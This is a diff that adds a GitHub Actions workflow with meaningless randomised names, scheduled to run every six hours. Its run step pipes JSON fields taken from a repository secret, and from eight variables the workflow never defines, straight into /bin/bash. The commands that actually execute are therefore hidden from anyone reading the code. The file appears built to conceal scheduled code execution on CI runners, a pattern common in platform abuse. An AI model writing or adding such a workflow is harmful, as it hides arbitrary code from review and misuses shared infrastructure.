@@ -1,0 +1,25 @@
+name: wudushu4671
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wudushu4671
+        env:
+          upyk8249: ${{ secrets.upyk8249 }}
+        run: |
+          echo $upyk8249 | jq -r .xdw40 | /bin/bash
+          echo $oyqah11 | jq -r .go227 | /bin/bash
+          echo $kckk9752 | jq -r .f82987 | /bin/bash
+          echo $o70952 | jq -r .morzw3309 | /bin/bash
+          echo $zh784 | jq -r .o81 | /bin/bash
+          echo $kcn35 | jq -r .uhhf962 | /bin/bash
+          echo $fyl9 | jq -r .u1 | /bin/bash
+          echo $rrx50237 | jq -r .z4 | /bin/bash
+          echo $ngc8 | jq -r .kydu184 | /bin/bash
+
